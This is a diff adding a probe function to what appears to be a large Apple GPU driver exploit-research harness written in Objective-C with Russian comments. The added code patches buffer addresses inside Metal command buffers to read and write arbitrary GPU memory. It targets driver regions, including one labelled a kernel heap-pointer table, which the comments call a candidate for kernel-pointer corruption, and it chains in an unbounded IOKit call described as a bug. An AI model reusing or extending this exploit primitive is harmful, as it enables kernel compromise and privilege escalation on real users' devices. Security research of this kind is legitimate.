@@ -44706,6 +44706,194 @@ static void p_bq91(void) {
     fsync(fileno(stderr));
 }
 
+// bq92_probe: одна проба свежими буферами. mode: 0=read (src→target),
+// 1=write (dest→target), 2=plain (без патча). Копия 0x1000. Возвращает
+// cb status (или <0); out41/outnz — счётчики в B; readback — контент B.
+static long bq92_probe(id<MTLCommandQueue> mq, id<MTLDevice> dev, int mode,
+                        uint64_t target, uint8_t *readback, size_t rbsz,
+                        long *out41, long *outnz) {
+    id<MTLBuffer> bA = [dev newBufferWithLength:0x1000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bB = [dev newBufferWithLength:0x1000 options:MTLResourceStorageModeShared];
+    if (!bA || !bB) return -1;
+    uint64_t ga = [bA gpuAddress], gb = [bB gpuAddress];
+    memset([bA contents], (mode == 1) ? 0x41 : 0x77, 0x1000);
+    memset([bB contents], 0, 0x1000);
+    id<MTLCommandBuffer> cb = [mq commandBuffer];
+    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+    [enc copyFromBuffer:bA sourceOffset:0 toBuffer:bB destinationOffset:0 size:0x1000];
+    [enc endEncoding];
+    long pn = 0;
+    if (mode != 2) {
+        void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+        if (!storage) return -2;
+        mach_vm_address_t addr = 0;
+        for (;;) {
+            mach_vm_size_t sz = 0;
+            vm_region_basic_info_data_64_t info;
+            mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+            mach_port_t obj;
+            if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                               (vm_region_info_t)&info, &cnt, &obj)) break;
+            if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
+                uint8_t *base = (uint8_t *)addr;
+                for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4) {
+                    uint64_t q = *(uint64_t *)(base + o);
+                    if (mode == 0 && q == ga) { *(uint64_t *)(base + o) = target; pn++; }
+                    else if (mode == 1 && q == gb) { *(uint64_t *)(base + o) = target; pn++; }
+                }
+            }
+            addr += sz;
+            if (!sz) break;
+        }
+    }
+    @try { [cb commit]; } @catch (NSException *ex) {
+        LOG("[bq92]   probe EXCEPTION %s", [[ex reason] UTF8String]);
+        return -3;
+    }
+    for (int w = 0; w < 300 && (long)[cb status] < 4; w++) usleep(10000);  // ≤3с
+    long c41 = 0, cnz = 0;
+    for (long i = 0; i < 0x1000; i++) {
+        uint8_t bb = ((uint8_t *)[bB contents])[i];
+        if (bb == 0x41) c41++;
+        if (bb) cnz++;
+    }
+    if (readback && rbsz) memcpy(readback, [bB contents], rbsz);
+    if (out41) *out41 = c41;
+    if (outnz) *outnz = cnz;
+    LOG("[bq92]   probe(%s) target %#llx: слотов %ld status %ld | B:41 %ld Bnz %ld",
+        mode == 0 ? "R" : mode == 1 ? "W" : "P", target, pn, (long)[cb status], c41, cnz);
+    return (long)[cb status];
+}
+
+// p_bq92 — v252: write-стойкость служебных VRAM-регионов (§84-next, §83-карта).
+// Через MT-PATCH (§82): R1 (read-снимок) → W (0x41×0x1000) → R2 (стойкость?).
+// Таргеты от безопасных к критичным; 0x100_0001c000 — таблица CPU(kheap)-
+// указателей (§83) — ЗАПИСЬ ТУДА = кандидат на kernel-pointer corruption.
+// Плюс child-chain: ребёнок родителя P с D = target−gP — окно ПОКРЫВАЕТ таргет
+// (ядро само вычисляет — b4 без bounds, §241) — звено «баг→таргет».
+static void p_bq92(void) {
+    LOG("[bq92] v252: write-зонды служебных VRAM-регионов (§84-next × §241)");
+    fsync(fileno(stderr));
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[bq92] no MTLDevice"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    if (!mq) { LOG("[bq92] no queue"); return; }
+
+    // K0 (§144): plain copy — контекст жив
+    long k41 = 0, knz = 0;
+    long ks = bq92_probe(mq, dev, 2, 0, NULL, 0, &k41, &knz);
+    LOG("[bq92] K0 plain: status %ld Bnz %ld %s", ks, knz, knz ? "OK — контекст жив" : "*** CONTROL FAILED ***");
+    if (!knz) return;
+    fsync(fileno(stderr));
+
+    // mconn (command-конн Metal) — для child-chain
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *devRef = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+    uint8_t *devImpl = devObj ? *(uint8_t **)(devObj + 872) : NULL;
+    uint32_t cand[64]; int ncand = 0;
+    uint8_t *objs[2] = { devRef, devImpl };
+    for (int oi = 0; oi < 2; oi++) {
+        if (!objs[oi]) continue;
+        for (long off = 0; off < 0x200; off += 4) {
+            uint32_t v = *(uint32_t *)(objs[oi] + off);
+            if (v > 0x1000 && v < 0x100000 && (v & 3) == 3) {
+                int dup = 0;
+                for (int k = 0; k < ncand; k++) if (cand[k] == v) dup = 1;
+                if (!dup && ncand < 60) cand[ncand++] = v;
+            }
+        }
+    }
+    io_connect_t mconn = 0;
+    for (int k = 0; k < ncand && !mconn; k++) {
+        uint8_t *o12 = must_map(0x1000);
+        memset(o12, 0, 0x1000);
+        uint64_t a2[2] = { 0x1000, 0 };
+        size_t oz = 0x10;
+        uint64_t oc[4] = {0,0,0,0}; uint32_t noc = 0;
+        kern_return_t k12 = IOConnectCallMethod(cand[k], 12, a2, 2, NULL, 0, oc, &noc, o12, &oz);
+        if (k12 == 0) mconn = cand[k];
+        vm_deallocate(mach_task_self(), (vm_address_t)o12, 0x1000);
+    }
+    LOG("[bq92] mconn 0x%x", mconn);
+
+    // Родитель P на Metal-конне (для child-chain и write-контроля)
+    uint64_t gP = 0, gP2 = 0;
+    uint8_t *cpuP = NULL, *cpuP2 = NULL;
+    uint32_t ridP = 0, ridP2 = 0;
+    if (mconn) {
+        ridP = gpu_resource2(mconn, 0x10000, &gP, &cpuP);
+        ridP2 = gpu_resource2(mconn, 0x10000, &gP2, &cpuP2);
+        if (cpuP) memset(cpuP, 0x33, 0x10000);
+        if (cpuP2) memset(cpuP2, 0x55, 0x10000);
+        LOG("[bq92] P rid %u gpuva %#llx | P2 rid %u gpuva %#llx (delta %#llx)",
+            ridP, gP, ridP2, gP2, gP2 ? gP2 - gP : 0);
+    }
+
+    // WC (§144): write-контроль на СВОЁМ буфере P2 — запись обязана лечь и читаться CPU
+    if (ridP2 && cpuP2) {
+        long s = bq92_probe(mq, dev, 1, gP2, NULL, 0, NULL, NULL);
+        long c41 = 0;
+        for (long i = 0; i < 0x10000; i += 0x40) if (cpuP2[i] == 0x41) c41++;
+        LOG("[bq92] WC dest->gP2: status %ld | cpuP2:41 %ld %s", s, c41,
+            c41 ? "OK — write-проба работает на writenable-цели" : "*** WRITE-CONTROL FAILED ***");
+        fsync(fileno(stderr));
+    }
+
+    // Таргеты §83-карты (space-нотация: 0x1_ = 0x100_00000000, 0x10_ = 0x1000_00000000)
+    struct { const char *n; uint64_t va; int critical; } tg[] = {
+        { "0x10_-base (qword 0x80, benign)",     0x100000000000ULL, 0 },
+        { "0x1_00110000 (descriptor structs)",   0x10000110000ULL, 0 },
+        { "0x1_00120000 (descriptor structs)",   0x10000120000ULL, 0 },
+        { "0x1_0000c000 (driver internals)",     0x1000000c000ULL, 0 },
+        { "0x1_0001c000 (kheap-PTR TABLE)",      0x1000001c000ULL, 1 },
+    };
+    uint8_t *snap = must_map(0x1000);
+    for (unsigned t = 0; t < sizeof(tg) / sizeof(tg[0]); t++) {
+        LOG("[bq92] === TARGET %u: %s @%#llx", t, tg[t].n, tg[t].va);
+        fsync(fileno(stderr));
+        // R1: читаем 0x1000 с таргета
+        long r1nz = 0, r141 = 0;
+        memset(snap, 0, 0x1000);
+        long s1 = bq92_probe(mq, dev, 0, tg[t].va, snap, 0x1000, &r141, &r1nz);
+        LOG("[bq92]   R1: status %ld Bnz %ld %s", s1, r1nz,
+            r1nz ? "MAPPED (контент есть)" : "нули/scratch — WRITE СКИПАЕМ");
+        if (r1nz) hexdump("[bq92]   R1-snap", snap, 0x80);
+        fsync(fileno(stderr));
+        if (!r1nz) continue;
+        // child-chain: окно ребёнка покрывает таргет (ядро вычисляет, b4 без bounds)
+        if (mconn && ridP) {
+            kern_return_t krc = 0xe00002be;
+            uint8_t *in = must_map(0x1000), *out = must_map(0x1000);
+            uint32_t rc = bq89_child(mconn, in, out, ridP, 0, tg[t].va - gP, 0, 0x1000, &krc);
+            LOG("[bq92]   child-chain: D=%#llx kr=%#x rid=%u win=%#llx (raw gP+D=%#llx) oracle=%#llx %s",
+                tg[t].va - gP, krc, rc, *(uint64_t *)(out + 0x00), gP + (tg[t].va - gP),
+                *(uint64_t *)(out + 0x50),
+                krc == 0 ? "*** ОКНО РЕБЁНКА ПОКРЫВАЕТ ТАГРЕТ (баг §241) ***" : "rejected");
+            vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
+            vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
+            fsync(fileno(stderr));
+        }
+        // W: 0x41×0x1000 в таргет
+        long ws = bq92_probe(mq, dev, 1, tg[t].va, NULL, 0, NULL, NULL);
+        LOG("[bq92]   W: status %ld %s", ws, ws == 4 ? "(commit прошёл)" : "*** аномалия ***");
+        fsync(fileno(stderr));
+        usleep(300000);
+        // R2: читаем снова — легла ли запись
+        long r2nz = 0, r241 = 0;
+        memset(snap, 0, 0x1000);
+        long s2 = bq92_probe(mq, dev, 0, tg[t].va, snap, 0x1000, &r241, &r2nz);
+        LOG("[bq92]   R2: status %ld Bnz %ld B:41 %ld %s", s2, r2nz, r241,
+            r241 ? "*** ЗАПИСЬ ЛЕГЛА — VRAM-ТАГРЕ WRITABLE! ***"
+                 : "(запись не легла: RO-регион или дроп трансляции)");
+        if (r2nz) hexdump("[bq92]   R2-snap", snap, 0x80);
+        fsync(fileno(stderr));
+        usleep(300000);
+    }
+    LOG("[bq92] ИТОГ: зонды завершены (устройство живо? = нет паники)");
+    fsync(fileno(stderr));
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -53311,6 +53499,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ89")) { p_bq89(); LOG("[probe13] bq89-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ90")) { p_bq90(); LOG("[probe13] bq90-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ91")) { p_bq91(); LOG("[probe13] bq91-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ92")) { p_bq92(); LOG("[probe13] bq92-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
